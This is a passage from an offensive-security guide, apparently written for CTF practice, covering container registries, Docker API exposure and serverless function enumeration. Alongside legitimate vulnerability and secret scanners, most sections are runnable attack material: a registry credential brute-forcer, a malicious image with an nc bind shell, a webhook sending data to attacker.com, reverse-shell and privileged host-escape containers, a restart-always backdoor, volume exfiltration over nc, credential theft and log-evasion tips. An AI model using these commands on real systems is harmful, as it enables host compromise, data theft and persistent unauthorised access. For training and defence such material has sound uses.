echo "[*] Auditing Helm release: $RELEASE in namespace: $NAMESPACE"

# Get values
echo -e "\n[+] User-supplied values:"
helm get values $RELEASE -n $NAMESPACE

# Check for secrets in values
echo -e "\n[*] Searching for potential secrets in values..."
helm get values $RELEASE -n $NAMESPACE --all | grep -iE "password|secret|key|token"

# Get manifest and scan
echo -e "\n[*] Scanning manifest for security issues..."
helm get manifest $RELEASE -n $NAMESPACE > /tmp/manifest.yaml
trivy config /tmp/manifest.yaml

# Check RBAC
echo -e "\n[+] RBAC resources created by release:"
helm get manifest $RELEASE -n $NAMESPACE | grep -E "kind: (Cluster)?Role"

rm /tmp/manifest.yaml
```

---

## Container Registry Scanning

### Overview

Container registries (Docker Hub, Harbor, AWS ECR, Azure ACR, GCR) store Docker images. Scanning registries can reveal vulnerable base images, exposed secrets in image layers, misconfigurations, and unauthorized access to private images.

### Registry Types and Authentication

#### Docker Hub

```bash
# Anonymous pull (public images)
docker pull nginx:latest

# Authenticated access
docker login
# Enter username and password

# Credentials stored in
cat ~/.docker/config.json

# Extract token for API access
TOKEN=$(cat ~/.docker/config.json | jq -r '.auths["https://index.docker.io/v1/"].auth')
```

#### AWS ECR

```bash
# Authenticate
aws ecr get-login-password --region <region> | \
  docker login --username AWS --password-stdin <account-id>.dkr.ecr.<region>.amazonaws.com

# List repositories
aws ecr describe-repositories --region <region>

# List images in repository
aws ecr list-images --repository-name <repo-name> --region <region>

# Get image details
aws ecr describe-images --repository-name <repo-name> --region <region>
```

#### Azure ACR

```bash
# Authenticate
az acr login --name <registry-name>

# List repositories
az acr repository list --name <registry-name>

# List tags for repository
az acr repository show-tags --name <registry-name> --repository <repo-name>

# Get image manifest
az acr repository show-manifests --name <registry-name> --repository <repo-name>
```

#### Google GCR

```bash
# Authenticate
gcloud auth configure-docker

# List images
gcloud container images list --repository=gcr.io/<project-id>

# List tags
gcloud container images list-tags gcr.io/<project-id>/<image-name>

# Describe image
gcloud container images describe gcr.io/<project-id>/<image-name>:<tag>
```

#### Harbor (Self-Hosted)

```bash
# Login
docker login <harbor-url>

# API authentication
curl -u "username:password" https://<harbor-url>/api/v2.0/projects

# Get projects
curl -X GET "https://<harbor-url>/api/v2.0/projects" \
  -H "Authorization: Basic $(echo -n username:password | base64)"

# List repositories in project
curl -X GET "https://<harbor-url>/api/v2.0/projects/<project-name>/repositories" \
  -H "Authorization: Basic $(echo -n username:password | base64)"
```

### Enumeration Techniques

#### Discover Registries in Kubernetes

```bash
# Check for image pull secrets
kubectl get secrets --all-namespaces | grep "docker\|registry"

# Extract registry credentials
kubectl get secret <secret-name> -n <namespace> -o json | \
  jq -r '.data[".dockerconfigjson"]' | base64 -d

# Decode credentials
echo '<base64-auth>' | base64 -d
# Format: username:password
```

#### Registry Metadata Extraction

```bash
# Docker Registry API v2

# Check registry version
curl https://<registry>/v2/

# List repositories (if authentication not required)
curl https://<registry>/v2/_catalog

# List tags for repository
curl https://<registry>/v2/<repository>/tags/list

# Get image manifest
curl https://<registry>/v2/<repository>/manifests/<tag>

# With authentication
curl -u username:password https://<registry>/v2/_catalog
```

#### Automated Registry Discovery

```bash
#!/bin/bash
# registry_discover.sh

# Check common registry URLs
REGISTRIES=(
  "registry.example.com"
  "docker.example.com"
  "harbor.example.com"
  "registry.local"
)

for reg in "${REGISTRIES[@]}"; do
  echo "[*] Testing $reg"
  
  # Test unauthenticated access
  curl -s -o /dev/null -w "%{http_code}" https://$reg/v2/ | grep -q 200 && \
    echo "[+] $reg - Unauthenticated access" || \
    echo "[-] $reg - Requires authentication or not found"
done
```

### Vulnerability Scanning

#### Trivy (Comprehensive Scanner)

```bash
# Install
sudo apt-get install trivy

# Scan local image
trivy image nginx:latest

# Scan remote image
trivy image <registry>/<repository>:<tag>

# Scan with authentication
trivy image --username <user> --password <pass> <registry>/<repository>:<tag>

# Output formats
trivy image --format json -o results.json nginx:latest
trivy image --format table nginx:latest

# Scan for specific severity
trivy image --severity HIGH,CRITICAL nginx:latest

# Scan including unfixed vulnerabilities
trivy image --ignore-unfixed=false nginx:latest

# Scan all images in registry
for repo in $(curl -s https://<registry>/v2/_catalog | jq -r '.repositories[]'); do
  for tag in $(curl -s https://<registry>/v2/$repo/tags/list | jq -r '.tags[]'); do
    echo "[*] Scanning $repo:$tag"
    trivy image <registry>/$repo:$tag
  done
done
```

#### Grype (Anchore Scanner)

```bash
# Install
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Scan image
grype nginx:latest

# Scan with specific format
grype nginx:latest -o json > scan-results.json
grype nginx:latest -o table

# Scan registry
grype registry:<registry>/<repository>:<tag>

# Filter by severity
grype nginx:latest --fail-on high
```

#### Clair (Container Vulnerability Scanner)

```bash
# [Unverified] Requires Clair server setup

# Install clairctl client
wget https://github.com/jgsqware/clairctl/releases/download/v1.2.8/clairctl-linux-amd64
chmod +x clairctl-linux-amd64
mv clairctl-linux-amd64 /usr/local/bin/clairctl

# Scan image
clairctl analyze -l <registry>/<repository>:<tag>

# Generate report
clairctl report -l <registry>/<repository>:<tag>
```

#### Docker Scan (Docker Desktop Built-in)

```bash
# Scan image
docker scan nginx:latest

# Detailed output
docker scan --severity high nginx:latest

# JSON output
docker scan --json nginx:latest
```

### Secret Detection in Images

#### Dive (Layer Analysis)

```bash
# Install
wget https://github.com/wagoodman/dive/releases/download/v0.11.0/dive_0.11.0_linux_amd64.deb
sudo dpkg -i dive_0.11.0_linux_amd64.deb

# Analyze image layers
dive nginx:latest

# CI mode (exit with error if efficiency threshold not met)
CI=true dive nginx:latest
```

#### Extract and Scan Image Layers

```bash
# Pull and save image
docker pull nginx:latest
docker save nginx:latest -o nginx.tar

# Extract tar
mkdir nginx_layers
tar -xf nginx.tar -C nginx_layers
cd nginx_layers

# Extract each layer
for layer in */layer.tar; do
  echo "[*] Extracting $layer"
  mkdir -p extracted_$(dirname $layer)
  tar -xf $layer -C extracted_$(dirname $layer)
done

# Search for secrets in all layers
find extracted_* -type f -exec grep -iH "password\|api_key\|secret\|token\|private_key" {} \; 2>/dev/null

# Search for SSH keys
find extracted_* -name "id_rsa" -o -name "id_dsa" -o -name "*.pem"

# Search for AWS credentials
find extracted_* -name "credentials" -o -name "config" | grep -i aws

# Search for database config files
find extracted_* -name "*.conf" -o -name "*.config" -o -name "appsettings*.json"
```

#### TruffleHog (Secret Scanning)

```bash
# Install
pip install trufflehog

# Scan image
trufflehog docker --image nginx:latest

# Scan with verified secrets only
trufflehog docker --image nginx:latest --only-verified

# Scan image from registry
trufflehog docker --image <registry>/<repository>:<tag> --username <user> --password <pass>

# JSON output
trufflehog docker --image nginx:latest --json > secrets.json
```

#### GitLeaks (Alternative Secret Scanner)

```bash
# Install
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
mv gitleaks /usr/local/bin/

# Extract image filesystem
docker create --name temp_container nginx:latest
docker export temp_container -o nginx_fs.tar
docker rm temp_container

# Extract and scan
mkdir nginx_fs
tar -xf nginx_fs.tar -C nginx_fs
gitleaks detect --source nginx_fs/ --verbose
```

### Image Manifest Analysis

#### Inspect Image Configuration

```bash
# Pull image
docker pull nginx:latest

# Inspect image
docker inspect nginx:latest

# Extract specific fields
docker inspect nginx:latest | jq '.[0].Config.Env'  # Environment variables
docker inspect nginx:latest | jq '.[0].Config.ExposedPorts'  # Exposed ports
docker inspect nginx:latest | jq '.[0].Config.Entrypoint'  # Entrypoint
docker inspect nginx:latest | jq '.[0].Config.Cmd'  # Default command

# Check for privileged settings
docker inspect nginx:latest | jq '.[0].Config.User'  # Running user (root if empty)
```

#### History Analysis

```bash
# View image build history
docker history nginx:latest

# Show full commands (untruncated)
docker history --no-trunc nginx:latest

# Check for sensitive data in build commands
docker history --no-trunc nginx:latest | grep -iE "password|secret|key|token"

# Export history to file
docker history --no-trunc --format "{{.CreatedBy}}" nginx:latest > history.txt
```

### Registry Exploitation

#### Unauthenticated Registry Access

```bash
# Test for anonymous pull access
curl -s https://<registry>/v2/_catalog

# If accessible, enumerate and pull images
for repo in $(curl -s https://<registry>/v2/_catalog | jq -r '.repositories[]'); do
  echo "[+] Repository: $repo"
  
  # Get tags
  curl -s https://<registry>/v2/$repo/tags/list | jq -r '.tags[]'
  
  # Pull latest
  docker pull <registry>/$repo:latest
done
```

#### Registry Credential Stuffing

```bash
#!/bin/bash
# registry_bruteforce.sh

REGISTRY=$1
USERLIST=$2
PASSLIST=$3

while IFS= read -r user; do
  while IFS= read -r pass; do
    echo "[*] Trying $user:$pass"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      -u "$user:$pass" \
      https://$REGISTRY/v2/_catalog)
    
    if [ "$response" = "200" ]; then
      echo "[+] SUCCESS: $user:$pass"
      echo "$user:$pass" >> valid_creds.txt
      break
    fi
  done < "$PASSLIST"
done < "$USERLIST"
```

#### Push Malicious Images (If Write Access)

```bash
# Build malicious image
cat <<EOF > Dockerfile
FROM alpine:latest
RUN apk add --no-cache netcat-openbsd
CMD ["nc", "-lvp", "4444", "-e", "/bin/sh"]
EOF

docker build -t malicious:latest .

# Tag for target registry
docker tag malicious:latest <registry>/internal-app:latest

# Push (overwrites legitimate image if same tag)
docker push <registry>/internal-app:latest

# [Inference] If registry lacks tag immutability, existing tags can be overwritten
```

#### Registry API Token Theft

```bash
# Docker Registry v2 uses bearer tokens

# Get authentication challenge
curl -I https://<registry>/v2/

# Response includes:
# Www-Authenticate: Bearer realm="https://<auth-server>/token",service="registry"

# Request token
curl -u username:password "https://<auth-server>/token?service=registry&scope=repository:<repo>:pull,push"

# Use token
TOKEN="<received-token>"
curl -H "Authorization: Bearer $TOKEN" https://<registry>/v2/_catalog
```

### Harbor-Specific Exploitation

#### Harbor API Enumeration

```bash
# Get projects (requires authentication)
curl -u "admin:Harbor12345" https://<harbor>/api/v2.0/projects

# List users
curl -u "admin:Harbor12345" https://<harbor>/api/v2.0/users

# Get project repositories
curl -u "admin:Harbor12345" https://<harbor>/api/v2.0/projects/<project-name>/repositories

# Get vulnerabilities for image
curl -u "admin:Harbor12345" "https://<harbor>/api/v2.0/projects/<project>/repositories/<repo>/artifacts/<tag>/additions/vulnerabilities"

# Scan image on-demand
curl -X POST -u "admin:Harbor12345" "https://<harbor>/api/v2.0/projects/<project>/repositories/<repo>/artifacts/<tag>/scan"
```

#### Harbor Webhook Abuse

```bash
# If attacker has project admin access, create malicious webhook

# Create webhook that exfiltrates data on push events
curl -X POST "https://<harbor>/api/v2.0/projects/<project-id>/webhook/policies" \
  -H "Content-Type: application/json" \
  -u "admin:Harbor12345" \
  -d '{
    "name": "backup-webhook",
    "enabled": true,
    "event_types": ["PUSH_ARTIFACT"],
    "targets": [{
      "type": "http",
      "address": "https://attacker.com/exfil",
      "skip_cert_verify": true
    }]
  }'

# Now all image pushes will notify attacker server with metadata
```

### AWS ECR Specific Attacks

#### ECR Policy Misconfiguration

```bash
# Get repository policy
aws ecr get-repository-policy --repository-name <repo-name> --region <region>

# Check for overly permissive policies
# Example vulnerable policy:
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": [
      "ecr:GetDownloadUrlForLayer",
      "ecr:BatchGetImage"
    ]
  }]
}

# [Inference] This allows anonymous public access to pull images
```

#### ECR Cross-Account Access

```bash
# If ECR policy allows cross-account access
# Attacker from different AWS account can pull images

# Set up cross-account credentials
export AWS_ACCESS_KEY_ID=<attacker-key>
export AWS_SECRET_ACCESS_KEY=<attacker-secret>

# Authenticate to victim's ECR
aws ecr get-login-password --region <region> | \
  docker login --username AWS --password-stdin <victim-account-id>.dkr.ecr.<region>.amazonaws.com

# Pull images
docker pull <victim-account-id>.dkr.ecr.<region>.amazonaws.com/<repo>:<tag>
```

### Azure ACR Specific Attacks

#### ACR Token Exploitation

```bash
# If ACR uses tokens instead of RBAC

# List tokens (requires permissions)
az acr token list --registry <registry-name>

# Show token credentials
az acr token credential generate --name <token-name> --registry <registry-name>

# Compromise token and authenticate
docker login <registry-name>.azurecr.io -u <token-name> -p <password>
```

#### ACR Admin Account Abuse

```bash
# Check if admin account enabled (insecure)
az acr update --name <registry-name> --admin-enabled true

# Get admin credentials
az acr credential show --name <registry-name>

# Admin account has full push/pull access
docker login <registry-name>.azurecr.io -u <username> -p <password>
```

### Mass Scanning Automation

#### Scan All Images in Kubernetes Cluster

```bash
#!/bin/bash
# k8s_image_scan.sh

echo "[*] Extracting images from all pods..."

# Get unique images
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | \
  sort -u > images.txt

echo "[*] Found $(wc -l < images.txt) unique images"

# Scan each image
while IFS= read -r image; do
  echo "[*] Scanning: $image"
  trivy image --severity HIGH,CRITICAL "$image" >> scan_results.txt
  echo "---" >> scan_results.txt
done < images.txt

echo "[+] Scan complete. Results in scan_results.txt"

# Summarize critical findings
grep -A 5 "CRITICAL" scan_results.txt > critical_vulns.txt
```

#### Registry Spider Tool

```bash
#!/bin/bash
# registry_spider.sh - Comprehensive registry enumeration

REGISTRY=$1
AUTH=$2  # username:password

echo "[*] Enumerating registry: $REGISTRY"

# Get repositories
if [ -z "$AUTH" ]; then
  REPOS=$(curl -s https://$REGISTRY/v2/_catalog | jq -r '.repositories[]')
else
  REPOS=$(curl -s -u "$AUTH" https://$REGISTRY/v2/_catalog | jq -r '.repositories[]')
fi

# Enumerate each repository
for repo in $REPOS; do
  echo "[+] Repository: $repo"
  
  # Get tags
  if [ -z "$AUTH" ]; then
    TAGS=$(curl -s https://$REGISTRY/v2/$repo/tags/list | jq -r '.tags[]')
  else
    TAGS=$(curl -s -u "$AUTH" https://$REGISTRY/v2/$repo/tags/list | jq -r '.tags[]')
  fi
  
  for tag in $TAGS; do
    echo "  [TAG] $tag"
    
    # Get manifest
    if [ -z "$AUTH" ]; then
      curl -s https://$REGISTRY/v2/$repo/manifests/$tag | jq '.' > "${repo}_${tag}_manifest.json"
    else
      curl -s -u "$AUTH" https://$REGISTRY/v2/$repo/manifests/$tag | jq '.' > "${repo}_${tag}_manifest.json"
    fi
    
    # Pull and scan
    docker pull $REGISTRY/$repo:$tag 2>/dev/null
    trivy image $REGISTRY/$repo:$tag --format json -o "${repo}_${tag}_scan.json" 2>/dev/null
  done
done

echo "[+] Enumeration complete"
```

### Dockerfile Security Analysis

#### Static Dockerfile Scanning

```bash
# hadolint - Dockerfile linter
docker run --rm -i hadolint/hadolint < Dockerfile

# Check for security issues
hadolint Dockerfile | grep -i "warning\|error"

# Common issues detected:
# - Using latest tag
# - Running as root
# - Unnecessary packages
# - Secrets in ENV
```

#### Dockerfile Best Practice Checker

```bash
#!/bin/bash
# dockerfile_audit.sh

DOCKERFILE=$1

echo "[*] Analyzing: $DOCKERFILE"

# Check for root user
if ! grep -q "USER" "$DOCKERFILE"; then
  echo "[!] Container runs as root (no USER directive)"
fi

# Check for latest tags
if grep -q ":latest" "$DOCKERFILE"; then
  echo "[!] Using 'latest' tag (non-deterministic)"
fi

# Check for secrets
if grep -iE "password|secret|key|token" "$DOCKERFILE"; then
  echo "[!] Potential secrets found in Dockerfile"
fi

# Check for curl|bash pattern
if grep -E "curl.*\|.*bash|wget.*\|.*sh" "$DOCKERFILE"; then
  echo "[!] Dangerous pipe-to-shell pattern detected"
fi

# Check for update without cleanup
if grep -q "apt-get update" "$DOCKERFILE" && ! grep -q "rm -rf /var/lib/apt/lists" "$DOCKERFILE"; then
  echo "[!] apt-get update without cleanup (larger image)"
fi

echo "[+] Audit complete"
```

---

## Docker API Exposure

### Overview

Docker exposes a REST API (typically on `/var/run/docker.sock` locally or `tcp://0.0.0.0:2375` remotely) for container management. Unauthorized access to the Docker API allows full container orchestration, often leading to host compromise via container escape.

### Discovery

#### Identify Exposed Docker Socket

```bash
# From compromised container - check if socket mounted
ls -la /var/run/docker.sock

# If exists, check permissions
stat /var/run/docker.sock

# Test accessibility
docker ps 2>/dev/null || echo "Docker socket not accessible or docker CLI not installed"

# Alternative without docker CLI
curl --unix-socket /var/run/docker.sock http://localhost/version
```

#### Network-Exposed Docker API

```bash
# Common ports: 2375 (unencrypted), 2376 (TLS), 4243, 4244

# Scan for exposed Docker API
nmap -p 2375,2376,4243,4244 <target-ip>

# Test connectivity
curl http://<target-ip>:2375/version

# Shodan query for exposed Docker APIs
# shodan search "port:2375 docker"
```

#### Kubernetes Context (Docker Socket Mount)

```bash
# Check pod spec for docker socket mount
kubectl get pod <pod-name> -o yaml | grep -A 5 "hostPath"

# Common vulnerable mount:
# volumeMounts:
# - name: docker-sock
#   mountPath: /var/run/docker.sock
# volumes:
# - name: docker-sock
#   hostPath:
#     path: /var/run/docker.sock
```

### Authentication Bypass

#### Unauthenticated Access

```bash
# Test for anonymous access
curl http://<target-ip>:2375/info

# If successful, API is completely exposed
curl http://<target-ip>:2375/containers/json  # List containers
curl http://<target-ip>:2375/images/json      # List images
```

#### TLS Certificate Bypass

```bash
# If Docker API uses TLS but certificates not validated

# Test without cert validation (curl)
curl -k https://<target-ip>:2376/version

# Test with docker client
docker -H tcp://<target-ip>:2376 --tls version

# [Inference] Self-signed or expired certificates may allow connection without proper CA validation
```

### API Enumeration

#### Version Information

```bash
# Get Docker version and system info
curl --unix-socket /var/run/docker.sock http://localhost/version | jq '.'

# Get system info
curl --unix-socket /var/run/docker.sock http://localhost/info | jq '.'

# Remote API
curl http://<target-ip>:2375/version | jq '.'
curl http://<target-ip>:2375/info | jq '.'
```

#### Container Enumeration

```bash
# List running containers
curl --unix-socket /var/run/docker.sock http://localhost/containers/json | jq '.'

# List all containers (including stopped)
curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1 | jq '.'

# Inspect specific container
curl --unix-socket /var/run/docker.sock http://localhost/containers/<container-id>/json | jq '.'

# Get container processes
curl --unix-socket /var/run/docker.sock http://localhost/containers/<container-id>/top
```

#### Image Enumeration

```bash
# List images
curl --unix-socket /var/run/docker.sock http://localhost/images/json | jq '.'

# Inspect image
curl --unix-socket /var/run/docker.sock http://localhost/images/<image-id>/json | jq '.'

# Get image history
curl --unix-socket /var/run/docker.sock http://localhost/images/<image-id>/history | jq '.'
```

#### Network and Volume Enumeration

```bash
# List networks
curl --unix-socket /var/run/docker.sock http://localhost/networks | jq '.'

# List volumes
curl --unix-socket /var/run/docker.sock http://localhost/volumes | jq '.'

# Inspect volume
curl --unix-socket /var/run/docker.sock http://localhost/volumes/<volume-name> | jq '.'
```

### Exploitation Techniques

#### Method 1: Privileged Container for Host Escape

```bash
# Create privileged container with host filesystem mounted
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "sleep 3600"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }' \
  http://localhost/containers/create?name=evil

# Start container
curl --unix-socket /var/run/docker.sock \
  -X POST \
  http://localhost/containers/evil/start

# Execute commands in container (access to host filesystem via /host)
curl --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "AttachStdin": false,
    "AttachStdout": true,
    "AttachStderr": true,
    "Cmd": ["chroot", "/host", "/bin/bash", "-c", "cat /etc/shadow"]
  }' \
  http://localhost/containers/evil/exec

# Get exec instance ID from response, then start it
curl --unix-socket /var/run/docker.sock \
  -X POST \
  http://localhost/exec/<exec-id>/start
```

#### Method 2: Host Network and PID Namespace

```bash
# Create container with host namespaces
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "NetworkMode": "host",
      "PidMode": "host",
      "Binds": ["/:/host"]
    },
    "OpenStdin": true,
    "Tty": true
  }' \
  http://localhost/containers/create?name=pwn

# Start and attach
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/pwn/start

# Now have access to host network and processes
```

#### Method 3: Shadow Docker (Reverse Shell Container)

```bash
# Create container that connects back to attacker
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "apk add --no-cache netcat-openbsd && nc <attacker-ip> 4444 -e /bin/sh"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }' \
  http://localhost/containers/create

# Start container (it will connect back)
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<container-id>/start

# On attacker machine
nc -lvnp 4444
```

#### Method 4: Docker-in-Docker Exploitation

```bash
# If docker.sock mounted in container, spawn new container on host

# From inside container with docker socket access
docker run -it --rm \
  --privileged \
  -v /:/host \
  alpine:latest \
  chroot /host /bin/bash

# Now have root shell on host system
```

#### Method 5: Credential Extraction from Containers

```bash
# List all running containers
CONTAINERS=$(curl --unix-socket /var/run/docker.sock http://localhost/containers/json | jq -r '.[].Id')

# Extract environment variables from each
for cid in $CONTAINERS; do
  echo "[+] Container: $cid"
  curl --unix-socket /var/run/docker.sock \
    http://localhost/containers/$cid/json | \
    jq '.Config.Env'
done

# Inspect volumes for sensitive data
docker volume ls
docker run --rm -v <volume-name>:/data alpine:latest ls -la /data
```

### Tools for Docker API Exploitation

#### docker-py (Python Library)

```python
#!/usr/bin/env python3
# docker_api_exploit.py

import docker

# Connect to Docker socket
client = docker.from_env()

# Or connect to remote API
# client = docker.DockerClient(base_url='tcp://target-ip:2375')

# Create privileged container
container = client.containers.run(
    'alpine:latest',
    command='/bin/sh -c "chroot /host /bin/bash"',
    privileged=True,
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    detach=True,
    stdin_open=True,
    tty=True
)

print(f"[+] Container created: {container.id}")
print(f"[+] Execute: docker attach {container.id}")
```

#### deepce (Docker Enumeration and Escape)

```bash
# Download
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh

# Run from inside container
./deepce.sh

# Features:
# - Detects Docker socket exposure
# - Checks for privileged mode
# - Identifies escape vectors
# - Enumerates sensitive files
```

#### BOtB (Break Out The Box)

```bash
# Install
git clone https://github.com/brompwnie/botb
cd botb
go build

# Run enumeration
./botb -autopwn

# Identifies:
# - Docker socket
# - Kubelet API
# - Cloud metadata services
# - Container capabilities
```

#### CDK (Container Duck)

```bash
# Download
wget https://github.com/cdk-team/CDK/releases/download/v1.5.2/cdk_linux_amd64
chmod +x cdk_linux_amd64

# Run evaluator
./cdk_linux_amd64 evaluate

# Exploit docker socket
./cdk_linux_amd64 run docker-sock-check
./cdk_linux_amd64 run docker-sock-deploy <image>

# Reverse shell via docker API
./cdk_linux_amd64 run docker-sock-shell <attacker-ip> <port>
```

### Automated Exploitation Script

```bash
#!/bin/bash
# docker_api_pwn.sh

SOCK="/var/run/docker.sock"
API_URL="http://localhost"

# Check if socket exists
if [ ! -S "$SOCK" ]; then
  echo "[-] Docker socket not found"
  exit 1
fi

echo "[+] Docker socket found: $SOCK"

# Test connectivity
if ! curl --unix-socket $SOCK $API_URL/version &>/dev/null; then
  echo "[-] Cannot connect to Docker API"
  exit 1
fi

echo "[+] Docker API accessible"

# Get Docker version
VERSION=$(curl -s --unix-socket $SOCK $API_URL/version | jq -r '.Version')
echo "[*] Docker version: $VERSION"

# Create privileged escape container
echo "[*] Creating escape container..."

CONTAINER_JSON='{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "while true; do sleep 60; done"],
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host"],
    "NetworkMode": "host",
    "PidMode": "host"
  }
}'

CONTAINER_ID=$(curl -s --unix-socket $SOCK \
  -H "Content-Type: application/json" \
  -d "$CONTAINER_JSON" \
  $API_URL/containers/create?name=escape_$(date +%s) | jq -r '.Id')

if [ -z "$CONTAINER_ID" ] || [ "$CONTAINER_ID" = "null" ]; then
  echo "[-] Failed to create container"
  exit 1
fi

echo "[+] Container created: $CONTAINER_ID"

# Start container
curl -s --unix-socket $SOCK -X POST $API_URL/containers/$CONTAINER_ID/start

echo "[+] Container started"
echo "[*] To get shell: docker exec -it $CONTAINER_ID chroot /host /bin/bash"
```

### Docker API over TCP Exploitation

```bash
# If Docker API exposed over network without authentication

# Set remote Docker host
export DOCKER_HOST=tcp://<target-ip>:2375

# Verify access
docker info

# List containers
docker ps -a

# Create escape container
docker run -it --rm \
  --privileged \
  --pid=host \
  --net=host \
  -v /:/host \
  alpine:latest \
  chroot /host /bin/bash

# Alternative: use nsenter to enter host namespaces
docker run -it --rm \
  --privileged \
  --pid=host \
  alpine:latest \
  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Post-Exploitation

#### Persistence via Malicious Container

```bash
# Create container that restarts automatically
docker run -d \
  --restart=always \
  --name backdoor \
  --privileged \
  -v /:/host \
  alpine:latest \
  /bin/sh -c 'while true; do nc -lvp 4444 -e /bin/sh; sleep 5; done'

# This container will survive reboots and maintain access
```

#### Data Exfiltration via Volumes

```bash
# Mount sensitive volume and exfiltrate
docker run --rm \
  -v production_db:/data \
  alpine:latest \
  tar czf - /data | \
  nc <attacker-ip> 9999

# On attacker machine
nc -lvnp 9999 > exfil_data.tar.gz
```

#### Docker Registry Credential Theft

```bash
# Docker credentials stored on host
docker run --rm \
  -v /:/host \
  alpine:latest \
  cat /host/root/.docker/config.json

# Extract and decode auth tokens
cat config.json | jq -r '.auths[].auth' | base64 -d
```

### Detection Evasion

```bash
# Use benign-looking container names
docker run -d --name kube-proxy-worker ...

# Clean up logs
docker logs <container-id> --follow &>/dev/null

# Remove container after exploitation
docker rm -f <container-id>

# Use short-lived containers
docker run --rm ...

# [Inference] Many monitoring tools focus on long-running suspicious containers
```

### Defense Verification (For CTF Context)

```bash
# Check if Docker socket is exposed in pods
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.volumes[]?.hostPath.path=="/var/run/docker.sock") | .metadata.name'

# Check for privileged containers
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.containers[]?.securityContext.privileged==true) | .metadata.name'

# Verify Docker API network exposure
nmap -p 2375,2376 <node-ips>
```

---

**Key Takeaways for CTF Scenarios:**

1. **Service Account Tokens**: Always check `/var/run/secrets/kubernetes.io/serviceaccount/token` in compromised containers - high-privilege SAs enable cluster takeover
2. **Helm Charts**: Scan for secrets in values.yaml, check RBAC permissions, analyze hooks for persistence opportunities
3. **Container Registries**: Look for unauthenticated access, hardcoded credentials in imagePullSecrets, and vulnerable base images with critical CVEs
4. **Docker API**: Socket exposure (`/var/run/docker.sock` mount or TCP port 2375) almost always leads to root on host via privileged container escape

---

# Serverless Security

## Function Enumeration

### Multi-Cloud Function Discovery

#### AWS Lambda Enumeration

```bash
# List all Lambda functions (requires credentials)
aws lambda list-functions --region us-east-1

# All regions enumeration
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "Region: $region"
  aws lambda list-functions --region $region --output table
done

# Get function configuration
aws lambda get-function --function-name FUNCTION_NAME --region us-east-1

# Get function code location
aws lambda get-function --function-name FUNCTION_NAME --query 'Code.Location' --output text

# Download function code
wget $(aws lambda get-function --function-name FUNCTION_NAME --query 'Code.Location' --output text) -O function.zip

# List function policies
aws lambda get-policy --function-name FUNCTION_NAME --region us-east-1

# List event source mappings
aws lambda list-event-source-mappings --function-name FUNCTION_NAME
```

#### Azure Functions Enumeration

```bash
# List all function apps (requires Azure CLI)
az functionapp list --output table

# Get specific function app details
az functionapp show --name FUNCTION_APP_NAME --resource-group RESOURCE_GROUP

# List functions in app
az functionapp function list --name FUNCTION_APP_NAME --resource-group RESOURCE_GROUP

# Get function keys
az functionapp keys list --name FUNCTION_APP_NAME --resource-group RESOURCE_GROUP

# Get function-specific key
az functionapp function keys list \
  --name FUNCTION_APP_NAME \
  --resource-group RESOURCE_GROUP \
  --function-name FUNCTION_NAME

# Download function app content
az functionapp deployment source show \
  --name FUNCTION_APP_NAME \
  --resource-group RESOURCE_GROUP
```

#### GCP Cloud Functions Enumeration

```bash
# List all functions
gcloud functions list --project=PROJECT_ID

# Describe specific function
gcloud functions describe FUNCTION_NAME --region=REGION --format=json

# Get IAM policy
gcloud functions get-iam-policy FUNCTION_NAME --region=REGION

# List Cloud Run services (Gen2 functions)
gcloud run services list --platform=managed

# Describe Cloud Run service
gcloud run services describe SERVICE_NAME --region=REGION
```

### Automated Enumeration Tools

#### Pacu (AWS)

```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Lambda enumeration modules
run lambda__enum
run lambda__backdoor_new_roles  # Identify backdoor opportunities
run lambda__backdoor_new_users
```

#### enumerate-iam (AWS)

```bash
# Install
pip3 install enumerate-iam

# Enumerate Lambda permissions
enumerate-iam --access-key AKIA... --secret-key SECRET --service lambda
```

#### ScoutSuite (Multi-Cloud)

```bash
# Install
pip3 install scoutsuite

# Scan AWS Lambda
scout aws --services lambda

# Scan Azure Functions
scout azure --services functions

# Scan GCP Functions
scout gcp --services cloudfunctions
```

### Function URL/Endpoint Discovery

#### AWS Lambda Function URLs

```bash
# List function URL configurations
aws lambda list-function-url-configs --function-name FUNCTION_NAME

# Get specific URL config
aws lambda get-function-url-config --function-name FUNCTION_NAME

# Common Lambda URL format
# https://UNIQUE_ID.lambda-url.REGION.on.aws/

# Brute force function URL patterns
for id in $(cat function-ids.txt); do
  curl -s -o /dev/null -w "%{http_code} - $id\n" \
    https://$id.lambda-url.us-east-1.on.aws/
done
```

#### API Gateway Enumeration

```bash
# List REST APIs
aws apigateway get-rest-apis --region us-east-1

# Get API resources
